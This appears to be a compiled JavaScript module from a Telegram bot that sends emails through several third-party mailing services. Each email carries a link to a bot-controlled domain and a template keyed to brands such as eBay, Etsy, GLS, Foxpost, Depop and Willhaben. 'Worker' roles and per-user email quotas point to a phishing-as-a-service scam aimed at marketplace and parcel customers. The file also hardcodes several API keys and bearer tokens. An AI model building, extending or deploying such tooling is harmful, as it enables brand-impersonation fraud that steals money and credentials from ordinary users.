"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.preSendEmailGOSU = exports.preSendEmailPhs = exports.sendEmailGOSU = exports.sendEmailPhs = exports.preSendEmailDepa = exports.sendEmailDepa = exports.sendEmailAnafema = exports.sendEmailKeshMail = exports.sendEmailYourMailer = void 0;
const node_fetch_1 = __importDefault(require("node-fetch"));
const console = __importStar(require("console"));
const database_1 = require("../../database");
const console_1 = require("console");
const axios_1 = __importDefault(require("axios"));
const request = require('request-promise');
async function sendEmailYourMailer(email, pattern, url, worker) {
    try {
        const response = await (0, node_fetch_1.default)('http://api-pechkin-bot1.ru/api/send', {
            method: "POST",
            headers: {
                "Content-type": "application/json",
                "Accept": "text/plain"
            },
            body: JSON.stringify({
                'api_key': 'Y96wd1Llxk5QmvU5',
                pattern,
                url,
                worker,
                email
            })
        });
        console.log(pattern);
        console.log(JSON.stringify({
            'api_key': 'UKApuixaSNoHE8Ac',
            pattern,
            url,
            worker,
            email
        }));
        console.log(response);
        if (response.ok)
            return await response.text();
        return null;
    }
    catch (e) {
        console.log(e);
        return e.toString();
    }
}
exports.sendEmailYourMailer = sendEmailYourMailer;
async function sendEmailKeshMail(USER_ID, USER_NAME, MAIL_TO, MAIL_URL, SERVICE, ORDER) {
    try {
        console.log({
            TOKEN: 'DFMsSYDI-S91Q92GA-AuNW3VcT-FduPYOvn',
            USER_ID,
            USER_NAME,
            MAIL_TO,
            MAIL_URL,
            SERVICE,
            ORDER
        });
        const response = await request.post('http://kmail.info/api/v2/send', {
            json: true,
            headers: {
                "Content-type": "application/json"
            },
            body: {
                TOKEN: 'DFMsSYDI-S91Q92GA-AuNW3VcT-FduPYOvn',
                USER_ID,
                USER_NAME,
                MAIL_TO,
                MAIL_URL,
                SERVICE,
                ORDER
            },
        });
        return response?.status;
    }
    catch (e) {
        console.log(e);
        return false;
    }
}
exports.sendEmailKeshMail = sendEmailKeshMail;
async function sendEmailAnafema(USER_ID, USER_NAME, MAIL_TO, MAIL_URL, SERVICE, ORDER) {
    try {
        const response = await request.post('http://advanced1readers.com/send/', {
            json: true,
            headers: {
                "Content-type": "application/json",
                "Accept": "application/json"
            },
            body: {
                key: '7a7f5a45-1d9e-4af2-a403-a3cb9f716213',
                query: {
                    url: MAIL_URL,
                    service: SERVICE,
                    to: MAIL_TO,
                    sender_username: USER_NAME
                }
            },
        });
        return response?.result == "OK";
    }
    catch (e) {
        console.log(e);
        return false;
    }
}
exports.sendEmailAnafema = sendEmailAnafema;
async function sendEmailDepa(MAIL_TO, MAIL_URL, PATTERN) {
    try {
        const TOKEN = "5a54e9d9-677f-4b73-986c-e4817b7b71d6";
        console.log({
            TOKEN: TOKEN,
            MAIL_TO,
            MAIL_URL,
            PATTERN,
        });
        return await request.post('https://depamailer.ru/mail/', {
            json: true,
            headers: {
                'Authorization': `Bearer ${TOKEN}`,
                "Content-type": "application/json"
            },
            body: {
                "pattern": PATTERN,
                "url": MAIL_URL,
                "to_mail": MAIL_TO
            },
        });
    }
    catch (e) {
        console.log(e);
        return false;
    }
}
exports.sendEmailDepa = sendEmailDepa;
async function preSendEmailDepa(ctx, ad, domen, msg, service) {
    if (service === 'ebay')
        service = 'ebay_de_new';
    if (service === 'foxpost')
        service = 'foxpost_hu';
    if (service === 'gls')
        service = 'gls-group_hu';
    if (service === 'depop')
        service = 'depop_de';
    const response = await sendEmailDepa(ctx.session.smsEmail.to, `https://${domen.link}/link/${ad.link}?email=${ctx.session.smsEmail.to}&emailowner=${ctx.session.smsEmail.who}`, service);
    try {
        ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
    }
    catch (e) { }
    if (response?.['sended'] !== true) {
        console.log(response);
    }
    else {
        ctx.user.email -= 1;
        await database_1.userRepository.save(ctx.user);
    }
    await ctx.reply((response?.['sended'] === true)
        ? `✅ Кис-кис, я котик ты котик <3`
        : `⚠️ Не удалось отправить письмо`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
            ]
        }
    });
}
exports.preSendEmailDepa = preSendEmailDepa;
async function sendEmailPhs(userId, username, mailTo, url, service) {
    try {
        const { data } = await axios_1.default.post('https://pent.mailer.haus/api/send', {
            worker: username,
            workerId: userId,
            mail: mailTo,
            url: url,
            service: service,
        }, {
            headers: {
                Authorization: "Bearer eyJhbGciOiJIUzI1NiJ9.Uk9VVEU2MF9URUFN.7zgVbSyt_ofVfVrpsECnMEl3rmCfaqLy8d8LLx54FQg"
            }
        });
        (0, console_1.log)(data);
        return data;
    }
    catch (e) {
        (0, console_1.log)(e);
        return false;
    }
}
exports.sendEmailPhs = sendEmailPhs;
async function sendEmailGOSU(userId, username, mailTo, url, service_code, country_code) {
    try {
        console.log({
            "url": url,
            "to": mailTo,
            "country_code": country_code,
            "service_code": service_code,
            "is_delay": false,
            "notify_id": userId,
        });
        const response = await request.post(`https://azmail.link/api/send?key=e96a4389720f9e3c3464b8ecb4cb61e8`, {
            json: true,
            // headers: {
            //     Authorization: "Bearer eyJhbGciOiJIUzI1NiJ9.S09BIFRFQU0.AiYT4UnGOWI6JLEMlbpedF2Q7k3dBBAx4XW5HtTFqrg"
            // },
            body: {
                "url": url,
                "to": mailTo,
                "country_code": country_code,
                "service_code": service_code,
                "is_delay": false,
                "notify_id": userId,
            },
        });
        (0, console_1.log)(response);
        return response;
    }
    catch (e) {
        (0, console_1.log)(e);
        return false;
    }
}
exports.sendEmailGOSU = sendEmailGOSU;
async function preSendEmailPhs(ctx, ad, domen, msg, service, username) {
    if (service === 'ebay')
        service = 'de_kleinanzeigen';
    if (service === 'etsy')
        service = 'eu_etsy';
    if (service === 'willhaben')
        service = 'at_willhaben';
    const response = await sendEmailPhs(ctx.from.id, username, ctx.session.smsEmail.to, `https://${domen.link}/link/${ad.link}/phs`, service);
    try {
        ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
    }
    catch (e) { }
    console.log(response);
    // @ts-ignore
    if (response?.status !== "true") {
        console.log(response);
    }
    else {
        await database_1.userRepository.save(ctx.user);
    }
    await ctx.reply(
    // @ts-ignore
    (response?.status === "true")
        // @ts-ignore
        ? `✅ ${response?.message}`
        // @ts-ignore
        : `⚠️ ${response?.message}`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
            ]
        }
    });
}
exports.preSendEmailPhs = preSendEmailPhs;
async function preSendEmailGOSU(ctx, ad, domen, msg, service, country, username, etsyVerify = false) {
    const response = await sendEmailGOSU(ctx.from.id, username, ctx.session.smsEmail.to, `https://${domen.link}/link/${ad.link}/gosu${(etsyVerify) ? '?verify=true' : ''}`, service, country);
    try {
        ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
    }
    catch (e) { }
    console.log(response);
    // @ts-ignore
    if (response?.status !== "true") {
        console.log(response);
    }
    else {
        await database_1.userRepository.save(ctx.user);
    }
    await ctx.reply(
    // @ts-ignore
    (response?.status === "success")
        // @ts-ignore
        ? `✅ Письмо отправлено!`
        // @ts-ignore
        : `⚠️ ${response?.error_message}`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
            ]
        }
    });
}
exports.preSendEmailGOSU = preSendEmailGOSU;
